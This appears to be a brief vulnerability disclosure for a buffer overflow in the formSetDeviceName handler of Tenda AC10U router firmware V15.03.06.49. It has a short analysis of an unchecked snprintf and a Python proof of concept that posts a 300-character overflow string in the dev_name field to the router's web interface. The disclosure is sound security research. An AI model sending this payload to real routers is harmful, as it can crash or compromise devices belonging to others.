# buffer overflow

## Tenda_AC10U_V1

version: V15.03.06.49

## Description:

There is a buffer overflow in httpd/formSetDeviceName

## Source:

you may download it from : https://www.tendacn.com/download/detail-3795.html

## Analyse:


![](11.png)

get value from devName ,send to set_device_name

![](12.png)

and dont send the mac ,we can get into else
finally call snprint ,dont check the length ,cause buff overflow



## POC
```
url = "http://192.168.1.13/goform/formSetDeviceName"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'dev_name': payload})
``` 
